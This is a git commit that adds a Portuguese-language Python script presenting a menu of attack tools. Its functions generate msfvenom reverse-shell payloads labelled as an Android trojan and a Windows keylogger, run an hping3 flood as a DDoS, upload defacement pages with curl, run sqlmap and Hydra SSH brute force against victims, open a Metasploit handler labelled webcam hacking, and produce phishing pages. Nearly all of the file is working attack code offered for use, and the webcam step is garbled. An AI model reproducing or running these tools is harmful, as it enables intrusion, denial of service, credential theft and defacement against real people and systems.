f17c50a38b3fafc496ace00017f0db4d3fcfeaa6
Јӊөҋ | 🇯🇲 <vicentinreidelas0@gmail.com>
2025-04-25 19:46:25 -0300

    Create Fuckyou.py

---
+++ Fuckyou.py
@@ -0,0 +1,141 @@
+import os
+import time
+
+def banner():
+    os.system("clear")
+    print("""
+⠀⠀⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+------> F U C K Y O U  M E N U  BY JHON  <------
+
+\033[1;32m[01] Criar Trojan
+[02] Ataque DDoS
+[03] Deface Page
+[04] SQLi Injector
+[05] Webcam Hack
+[06] Escanear Portas (Nmap)
+[07] Gerar Página Phishing
+[08] Criar Keylogger
+[09] Captura de Pacotes Wi-Fi (Aircrack-ng)
+[10] Exploits do Metasploit
+[11] Brute Force SSH (Hydra)
+[00] Sair\033[0m
+""")
+
+def criar_trojan():
+    lhost = input("LHOST > ")
+    lport = input("LPORT > ")
+    nome = input("Nome do APK > ")
+    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {nome}.apk")
+    print(f"Trojan criado: {nome}.apk")
+    input("Pressione Enter para continuar...")
+
+def ataque_ddos():
+    ip = input("IP do alvo > ")
+    porta = input("Porta > ")
+    print("Iniciando ataque DDoS com hping3...")
+    os.system(f"hping3 -S {ip} -p {porta} --flood")
+    input("Pressione Enter para continuar...")
+
+def deface():
+    site = input("URL do site > ")
+    page = input("Página do deface (ex: index.html) > ")
+    os.system(f"curl -T {page} {site}")
+    print("Deface enviado (se o site estiver vulnerável).")
+    input("Pressione Enter para continuar...")
+
+def sqli():
+    alvo = input("URL vulnerável > ")
+    print("Verificando SQL Injection...")
+    os.system(f"sqlmap -u {alvo} --dbs")
+    input("Pressione Enter para continuar...")
+
+def webcam_hack():
+    ip = input("IP da vítima > ")
+    porta = input("Porta > ")
+    print("Iniciando captura de webcam...")
+    os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {porta}; exploit'")
+    input("Pressione Enter para continuar...")
+
+def escanear_portas():
+    alvo = input("IP alvo > ")
+    os.system(f"nmap {alvo}")
+    input("Pressione Enter para continuar...")
+
+def gerar_phishing():
+    site = input("URL do site alvo > ")
+    os.system(f"python3 phishing_page.py {site}")
+    input("Pressione Enter para continuar...")
+
+def criar_keylogger():
+    print("Criando keylogger... (Exemplo básico para Windows)")
+    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA -f exe -o keylogger.exe")
+    print("Keylogger gerado: keylogger.exe")
+    input("Pressione Enter para continuar...")
+
+def captura_wifi():
+    print("Capturando pacotes Wi-Fi com Aircrack-ng...")
+    os.system("airodump-ng wlan0")
+    input("Pressione Enter para continuar...")
+
+def exploits_metasploit():
+    print("Iniciando Metasploit para usar exploits...")
+    os.system("msfconsole")
+    input("Pressione Enter para continuar...")
+
+def brute_force_ssh():
+    ip = input("IP da vítima > ")
+    usuario = input("Usuário SSH > ")
+    wordlist = input("Caminho da Wordlist > ")
+    print("Iniciando brute force com Hydra...")
+    os.system(f"hydra -l {usuario} -P {wordlist} ssh://{ip}")
+    input("Pressione Enter para continuar...")
+
+def menu():
+    while True:
+        banner()
+        op = input("Selecione uma opção > ")
+
+        if op == "1":  
+            criar_trojan()  
+        elif op == "2":  
+            ataque_ddos()  
+        elif op == "3":  
+            deface()  
+        elif op == "4":  
+            sqli()  
+        elif op == "5":  
+            webcam_hack()  
+        elif op == "6":  
+            escanear_portas()  
+        elif op == "7":  
+            gerar_phishing()  
+        elif op == "8":  
+            criar_keylogger()  
+        elif op == "9":  
+            captura_wifi()  
+        elif op == "10":  
+            exploits_metasploit()  
+        elif op == "11":  
+            brute_force_ssh()
+        elif op == "0":  
+            print("Saindo...")  
+            break  
+        else:  
+            print("Opção inválida!")  
+            time.sleep(1)
+
+menu()
